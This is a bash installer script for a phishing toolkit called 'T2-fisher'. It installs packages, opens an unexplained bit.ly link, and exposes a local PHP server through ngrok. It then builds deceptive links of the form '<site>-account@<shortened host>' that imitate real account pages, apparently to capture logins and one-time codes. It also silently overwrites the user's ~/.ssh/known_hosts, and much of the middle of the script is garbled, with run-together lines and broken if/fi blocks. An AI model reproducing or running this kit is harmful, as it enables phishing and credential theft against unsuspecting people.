#!/bin/bash

banner() {
clear
printf "\e[0m\n"
printf "\e[0m\e[93m  _______        _                            _\e[0m\n"             
printf "\e[0m\e[96m |__   __|      | |                          | |\e[0m\n"             
printf "\e[0m\e[93m    | | ___  ___| |__  _ __   ___   ___ _   _| |__   ___ _ __\e[0m\n" 
printf "\e[0m\e[96m    | |/ _ \/ __| '_ \| '_ \ / _ \ / __| | | | '_ \ / _ \ '__|\e[0m\n"
printf "\e[0m\e[92m    | |  __/ (__| | | | | | | (_) | (__| |_| | |_) |  __/ |\e[0m\n" 
printf "\e[0m\e[96m    |_|\___|\___|_| |_|_| |_|\___/ \___|\__, |_.__/ \___|_|\e[0m\n"   
printf "\e[0m\e[93m                                         __/ |\e[0m\n"               
printf "\e[0m\e[96m                                        |___/     v:1.0\e[0m\n"          
printf "\e[0m\n"
printf " \e[0m\e[92m                       CODED BY TECHNOCYBER & HACKERSPUNK\e[0m\n"   
printf "\e[0m\n"
}
banner
printf "\e[0m\n"
printf "\e[0m\e[1;97m                |------------[ INSTALLING PACKAGES ]------------|\e[0m\n"
printf "\e[0m\n"
apt-get update
apt-get upgrade -y
apt-get -y install ssh
apt-get -y install curl
apt-get -y install php
apt-get -y install unzip
apt-get -y install openssh-server
apt-get -y install openssh
clear
xdg-open https://bit.ly/3f1AQiK
printf "\e[0m\n"
printf "\e[0m\e[1;97m             |------------[ INSTALLING DEPENDENCIES ]-------------|\e[0m\n"
if [[ -d .htr ]]; then
printf ""
else
mkdir .htr
fi
if [[ -d logs ]]; then
printf ""
else
mkdir logs
fi
OS=$(uname -o | grep -o "Android") ARG=$1 cd server if 
[ ! -f "ngrok" ] then
:
else CLR() { printf " \r"
}
net_check() { connection="$(ping -c 1 -q www.google.com 
&> /dev/null; echo $?)" if [[ "$connection" != 0 ]] 
then printf "\e[94m(\e[0m>\e[94m)\e[0m Ngrok error, 
debug: connection\n" exit fi
}
stop() { if [[ $checkngrok == *'ngrok'* ]]; then pkill 
-f -2 ngrok > /dev/null 2>&1 killall -2 ngrok > 
/dev/null 2>&1 fi checkngrok=$(ps aux | grep -o "ngrok" 
| head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1) 
checkssh=$(ps aux | grep -o "ssh" | head -n1) if [[ 
$checkngrok == *'ngrok'* ]]; then pkill -f -2 ngrok > 
/dev/null 2>&1 killall -2 ngrok > /dev/null 2>&1 fi if 
[[ $checkphp == *'php'* ]]; then killall -2 php > 
/dev/null 2>&1 fi if [[ $checkssh == *'ssh'* ]]; then 
killall -2 ssh > /dev/null 2>&1 fi
}
stop &> /dev/null if [[ $OS == *'Android'* ]];then 
./ngrok http 8080 > /dev/null 2>&1 & else sudo ./ngrok 
http 8080 > /dev/null 2>&1 & fi http_ngrok() { 
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | 
grep -o "https://[0-9a-z]*\.ngrok.io")
}
sleep 0 CLR printf "\e[94m(\e[0m>\e[94m)\e[0m Starting 
Server at http Port : (8080)...\e[0m\n" net_check 
http_ngrok if [[ -z $link ]];then printf "$link" &> 
/dev/null sleep 10 http_ngrok printf "$link" &> 
/dev/null fi if [[ -z $link ]];then CLR printf 
"\e[94m(\e[0m>\e[94m)\e[0m Ngrok error, debug: ./ngrok 
http (8080)...\e[0m\n" stop &> /dev/null exit 1 fi 
short=$(curl -s 
https://is.gd/create.php\?format\=simple\&url\=${link}) 
shorter=${short#https://} if [[ ${ARG} == "-s" ]];then 
if [[ ${SITENUM} == ${SITENUM} ]];then 
url="https://${SITENUM,,}-account@${shorter}" fi else 
if [[ ${MODE} == "withOTP" ]] then 
url="https://${SITESX[${input} 
-1],,}-account@${shorter}" else 
url="https://${SITES[${input} 
-1],,}-account@${shorter}" fi fi CLR printf 
"\e[94m(\e[0m>\e[94m)\e[0m Your https link : 
\e[4m${url}\e[0m" fi
cd ..
else
printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
exit 1
fi
fi
fi
if [[ -d ~/.ssh ]]; then
printf ""
else
mkdir ~/.ssh
fi
chmod +x T2-fisher
printf "|1|SVjtt9mtL4P/5lsqaielF1pJHvM=|6QmJXxfPd9A5uUaFI1RV2H4brTs= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3lJnhW1oCXuAYV9IBdcJA+Vx7AHL5S/ZQvV2fhceOAPgO2kNQZla6xvUwoE4iw8lYu3zoE1KtieCU9yInWOVI6W/wFaT/ETH1tn55T2FVsK/zaxPiHZVJGLPPdEEid0vS2p1JDfc9onZ0pNSHLl1QusIOeMUyZ2bUMMLLgw46KOT9S3s/LmxgoJ3PocVUn5rVXz/Dng7Y8jYNe4IFrZOAUsi7hNBa+OYja6ceefpDvNDEJ1BdhbYfGolBdNA7f+FNl0kfaWru4Cblr843wBe2ckO/sNqgeAMXO/qH+SSgQxUXF2AgAw+TGp3yCIyYoOPvOgvcPsQziJLmDbUuQpnH\n|1|PiraXMKgzzt9DdPRSLAtRvRad0Y=|2W162QXfHJvKKZWIaRyZO6VFWJI= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3lJnhW1oCXuAYV9IBdcJA+Vx7AHL5S/ZQvV2fhceOAPgO2kNQZla6xvUwoE4iw8lYu3zoE1KtieCU9yInWOVI6W/wFaT/ETH1tn55T2FVsK/zaxPiHZVJGLPPdEEid0vS2p1JDfc9onZ0pNSHLl1QusIOeMUyZ2bUMMLLgw46KOT9S3s/LmxgoJ3PocVUn5rVXz/Dng7Y8jYNe4IFrZOAUsi7hNBa+OYja6ceefpDvNDEJ1BdhbYfGolBdNA7f+FNl0kfaWru4Cblr843wBe2ckO/sNqgeAMXO/qH+SSgQxUXF2AgAw+TGp3yCIyYoOPvOgvcPsQziJLmDbUuQpnH\n" > ~/.ssh/known_hosts
printf "\e[0m\n"
printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Installation Completed !! \e[0m\n"
printf "\e[0m\n"
sleep 2
bash T2-fisher
printf "\e[0m\n"
